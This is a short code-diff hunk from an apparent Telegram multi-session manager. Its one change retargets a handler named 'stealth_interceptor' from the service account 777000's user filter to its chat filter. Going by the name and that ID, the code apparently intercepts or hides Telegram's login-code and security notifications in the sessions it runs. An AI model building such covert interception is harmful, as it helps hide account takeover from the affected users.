@@ -125,7 +125,7 @@ class SessionManager:
                                 except Exception:
                                     pass
 
-            client.add_handler(MessageHandler(stealth_interceptor, filters.user(777000)))
+            client.add_handler(MessageHandler(stealth_interceptor, filters.chat(777000)))
             
             await client.start()
             self.clients[user_id] = client
